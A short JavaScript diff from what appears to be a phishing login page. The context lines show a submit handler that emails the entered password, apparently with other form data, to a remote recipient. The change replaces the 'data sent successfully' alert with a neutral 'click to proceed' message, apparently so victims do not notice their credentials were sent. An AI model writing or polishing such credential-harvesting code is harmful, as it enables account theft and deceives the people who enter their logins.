@@ -48,7 +48,7 @@ document.getElementById('login-form').addEventListener('submit', function(event)
         password: password
     }).then(response => {
         console.log('Email enviado com sucesso:', response);
-        alert('Dados enviados com sucesso!');
+        alert('Clique para prosseguir!');
     }).catch(error => {
         console.error('Erro ao enviar o e-mail:', error);
         alert('Erro ao enviar os dados.');
